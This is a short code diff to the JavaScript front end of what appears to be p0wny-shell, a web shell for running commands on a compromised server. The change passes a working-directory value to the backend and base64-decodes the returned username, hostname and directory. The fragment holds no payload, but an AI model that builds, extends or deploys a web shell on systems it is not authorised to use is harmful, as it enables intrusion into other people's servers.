@@ -61,15 +61,16 @@ class P0wnyShell extends HTMLElement {
         this.userName = this.getAttribute('username') || this.userName;
         this.hostName = this.getAttribute('hostname') || this.hostName;
         this.backend = this.getAttribute('backend') || this.backend;
+        this.cwd = this.getAttribute('cwd');
 
-        this.updateCwd();
+        this.updateCwd(this.cwd);
         this.eShellCmdInput.focus();
 
         // fetch real username and hostname from backend
-        this.makeRequest('?feature=userhost', {}, function (response) {
-            this.userName = response.username || this.userName;
-            this.hostName = response.hostname || this.hostName;
-            this.updateCwd();
+        this.makeRequest('?feature=userhost', {cwd: this.cwd}, function (response) {
+            this.userName = response.username ? atob(response.username) : this.userName;
+            this.hostName = response.hostname ? atob(response.hostname) : this.hostName;
+            this.updateCwd(atob(response.cwd));
         }.bind(this));
     }
 
